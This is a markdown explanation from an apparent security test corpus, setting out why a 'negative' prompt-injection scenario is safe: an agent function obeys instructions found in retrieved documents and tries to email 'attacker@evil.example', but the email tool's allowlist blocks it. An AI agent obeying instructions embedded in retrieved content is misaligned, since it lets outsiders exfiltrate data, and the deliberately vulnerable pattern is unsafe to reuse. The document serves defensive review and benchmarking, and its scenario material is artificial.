# Why the negative variant is not a finding

## What it looks like

`scenarios/agency_retrieved_doc/negative/app.py` contains this
function:

```python
def agent_turn(
    user_message: str,
    docs: list[Document],
    email: EmailTool,
) -> list[ToolCall]:
    instructions = extract_instructions(user_message, source="user_input")
    for doc in docs:
        instructions.extend(extract_instructions(doc.text, source="retrieved_doc"))

    calls: list[ToolCall] = []
    for instruction in instructions:
        call = email.send(to=instruction.recipient, body="summary")
        if call is not None:
            calls.append(call)
    return calls
```

This is **identical** to `vulnerable/app.py:agent_turn()`. Byte for
byte.

The code pattern is the one the Semgrep rule
(`sast/ea_tool_no_provenance_check.yaml`) targets. A code-review pass
that only reads `agent_turn()` would flag it. The rule fires on this
variant.

## Why it is not a finding

Because `main()` constructs the tool with an **allowlist**:

```python
email = EmailTool(allowed_recipients={PARTNER_ADDRESS})
```

The agent still extracts the injected instruction and still calls
`email.send(to="attacker@evil.example")`. The tool inspects the
recipient, finds it outside the allowlist, and returns `None` without
recording a call. No email leaves the system.

The excessive-agency effect the finding describes is that the agent
performs an outbound action driven by retrieved content. Here that
effect does not occur, because the tool refuses. The vulnerable
behavior is present in the agent; the consequence is not present in
the deployment.

## Why this is a *hard* negative

A naive non-finding would differ from the vulnerable case in an
obvious way: a filter in the agent, a different function name, a
provenance check the reviewer can see. This one keeps the vulnerable
agent verbatim. The only difference is how the tool was constructed
at the call site.

That difference is invisible to code-pattern matching. The Semgrep
rule fires here for the same reason it fires in scenario 02: it
reads the function, not the deployment. The deterministic tests are
what distinguish the two cases, because they run both.

The contrast test
(`test_negative_function_sends_against_permissive_tool`) makes the
distinction explicit. It takes the negative's *unmodified*
`agent_turn()` and runs it with a permissive `EmailTool`. The send
occurs. This proves the negative is safe because of tool
configuration, not because of the code.

## The condition that would flip it into a finding

This negative becomes a genuine EA-2026-001 finding if:

1. The tool is constructed without `allowed_recipients`, or
2. The allowlist is widened to include `attacker@evil.example` (for
   example, a wildcard, a domain-level rule, or an address that
   happens to match), or
3. A second code path constructs the tool and passes it to the same
   `agent_turn()` without the allowlist.

Any of these would let the retrieved-doc instruction reach the
attacker, at which point the identical `agent_turn()` would produce
the finding.

## What this teaches

This is the third instance of the same pattern in the corpus:

| Scenario | Vulnerable function | Negative is safe because |
|---|---|---|
| 01 | `retrieve()` | the store is per-tenant |
| 02 | `agent_turn()` (memory) | the store is per-user |
| 03 | `agent_turn()` (tool) | the tool has an allowlist |

In every case the code shape is identical and the safety lives in
construction. Static analysis sees the function. The deployment is
what determines whether the function is dangerous. That is the
argument for treating the annotation — actor, trust boundary,
control scope — as the deliverable.

The negative here is also the most "production-realistic" of the
three. Outbound allowlists are common. A reviewer who looks at this
variant and says "that is fine, the tool will refuse" is correct. The
WHY_NOT_A_FINDING file exists so that judgment is written down rather
than assumed.

## Verification

```
uv run python -m scenarios.agency_retrieved_doc.negative.app
```

Expected output (no LEAK line):

```
Agent turn with a retrieved doc containing an injected instruction:
  (no outbound tool calls)
```
